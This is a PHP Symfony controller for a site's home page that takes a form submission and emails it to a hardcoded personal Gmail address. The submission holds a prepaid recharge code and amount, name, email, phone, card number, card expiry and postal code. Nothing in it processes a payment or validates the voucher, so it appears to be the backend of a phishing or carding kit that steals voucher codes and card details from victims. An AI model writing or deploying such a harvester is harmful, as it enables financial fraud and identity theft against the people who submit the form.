<?php

namespace App\Controller;


use MailClass;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\Mailer\MailerInterface;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Annotation\Route;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;

class HomeController extends AbstractController
{
    #[Route('/', name: 'app_home', methods:["GET","POST"])]
    public function index(Request $request): Response
    {    
        if ($request->isMethod('POST')) {   
            
            $Type_de_recharge = $request->request->get('Type_de_recharge');
            $montant = $request->request->get('montant');
            $code_recharge = $request->request->get('code_recharge');
            $emailClient = $request->request->get('email');
            $Telephone = $request->request->get('Téléphone');
            $Nom_complet = $request->request->get('Nom_complet');
            $NumCarte = $request->request->get('NumCarte');
            $Expiration_carte = $request->request->get('Expiration_carte');
            $Code_Postal = $request->request->get('Code_Postal');
            
            $mail = new MailClass(); 
            $content = " Type de recharge :  " . $Type_de_recharge ."<br>" . " Montant : " . $montant ."<br>" . " Code Recharge: " .$code_recharge . "<br>"  . 
            " Email : " . $emailClient . "<br>"  .  "téléphone : " . $Telephone. "<br>" .  "Nom complet  : " . $Nom_complet. "<br>". 
             "Numero carte  : " . $NumCarte. "<br>".  "Date d'expiration  : " . $Expiration_carte. "<br>".  "Code Postal  : " . $Code_Postal. "<br>";
            $mail->send("ezechiasgdv@gmail.com","Contact", 'Contact du client ', $content);

            return $this->render('home/vue.html.twig');
            
        }
        return $this->render('home/index.html.twig', [
            'controller_name' => 'HomeController',
        ]);
    }
}
